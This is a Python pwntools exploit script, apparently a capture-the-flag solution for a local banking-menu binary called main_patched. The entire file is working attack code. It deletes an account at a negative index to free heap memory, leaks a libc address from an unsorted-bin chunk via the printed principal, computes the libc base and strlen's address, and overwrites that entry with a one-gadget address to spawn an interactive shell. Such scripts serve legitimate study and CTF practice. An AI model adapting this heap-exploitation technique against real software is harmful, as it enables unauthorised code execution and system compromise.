from pwn import *


def uint64_to_double(u):
  return struct.unpack('<d', struct.pack('<Q', u))[0]
def parse_ascii_double_to_ull(b):
    value = float(b.decode())
    ull = struct.unpack('<Q', struct.pack('<d', value))[0]
    return ull
def createAccnt(idx):
    p.recvuntil(b"CHOICE >")
    p.sendline(b"1")
    p.recvuntil(b"ACCOUNT? >")
    p.sendline(idx)

def deleteAccnt(idx,opt):
    p.recvuntil(b"CHOICE >")
    p.sendline(b"2")
    p.recvuntil(b"DELETE? >")
    p.sendline(idx)
    p.recvuntil(b"PRINCIPAL: ")
    leak1=p.recvuntil(b",")[:-1]
    p.recvuntil(b"INTEREST: ")
    leak2=p.recvuntil(b'\n')[:-1]
    p.sendline(opt)
    return (leak1,leak2)
elf=ELF("./main_patched")
p=process("./main_patched")
gdb.attach(p)
context(os='linux',arch='amd64')

createAccnt(b"0")
deleteAccnt(b"-1",b"Y")
createAccnt(b"1")
leaks=deleteAccnt(b"1",b"N")
unsorted_leak=parse_ascii_double_to_ull(leaks[0])
libc_base=unsorted_leak-0x1d2cc0-0x470
print(hex(libc_base))
strlen=libc_base+0x1d2080
print(hex(strlen))
print(hex(unsorted_leak))
a=uint64_to_double(strlen)
b=uint64_to_double(unsorted_leak)
print(a/b)
c=a/b
p.sendline(b"3")
p.sendline(b"1")
p.sendline(str(c).encode())
p.sendline(b"5")
p.sendline(b"4")
p.sendline(p64(0xd509f+libc_base))
p.interactive()